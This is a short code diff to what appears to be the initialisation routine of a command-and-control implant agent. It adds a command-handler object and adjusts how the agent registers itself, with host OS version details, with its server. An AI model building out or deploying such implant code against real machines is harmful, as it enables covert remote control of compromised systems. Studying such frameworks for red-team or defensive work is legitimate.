@@ -7,6 +7,7 @@
 #include "../shared/nt.hpp"
 #include "../networkd/network.hpp"
 #include "../hades/hades.h"
+#include "../cmds/cmds.hpp"
 #include "config.hpp"
 
 
@@ -138,10 +139,12 @@ ULONG GetPPID() {
 
 BOOL InitAgent() {
 	
-	hades      = AllocMemory<Hades>(sizeof(Hades));
-	g_ByteMgr =  AllocMemory <bytes>    (sizeof(bytes));
-	g_Network =  AllocMemory <Network>  (sizeof(Network));
-	if (!LoadAPIS()) { return FALSE; }
+	hades		  =  AllocMemory <Hades>     (sizeof(Hades));
+	g_ByteMgr     =  AllocMemory <bytes>     (sizeof(bytes));
+	g_Network	  =  AllocMemory <Network>   (sizeof(Network));
+	g_Commander	  =  AllocMemory <commanders>(sizeof(commanders));
+
+	if (!LoadAPIS())   { return FALSE; }
 	if (!LoadConfig()) { return FALSE; }
 	
 	
@@ -208,7 +211,7 @@ BOOL InitAgent() {
 	g_ByteMgr->Write4(Minor);
 	g_ByteMgr->Write4(Major);
 	g_ByteMgr->Write4(Build);
-	g_Network->RegisterClient(g_ByteMgr->OutData, g_ByteMgr->index);
+	g_Network->RegisterClient(g_ByteMgr->OutData, g_ByteMgr->WriteIndex);
 	
 
 
